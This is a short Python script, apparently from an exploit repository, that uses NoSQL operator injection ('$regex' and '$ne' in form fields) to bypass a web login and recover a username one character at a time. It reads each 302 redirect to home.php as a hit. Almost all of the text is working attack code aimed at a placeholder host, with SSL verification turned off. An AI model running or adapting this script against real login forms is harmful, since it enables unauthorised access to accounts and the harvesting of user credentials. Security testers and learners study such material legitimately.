#In order for this script to work properly you will need the first character of the user name you can bruteforce first character from this script First-Character-BruteForce.py inthsi repo

import requests
import urllib3
import string
import urllib
# Disable SSL warnings
urllib3.disable_warnings()

# Change the vaule of the username below with the one you found from this script First-Character-BruteForce.py in this repo 
username="a"
password="itdoesntmatter"
u="http://example.local/"
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.ascii_lowercase:
        payload='username[$regex]=^%s.*&password[$ne]=%s&login=login' % (username + c, password)
        r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
        if r.status_code == 302 and r.headers['Location'] == 'home.php':
            print("Found one more char : %s" % (username+c))
            username += c
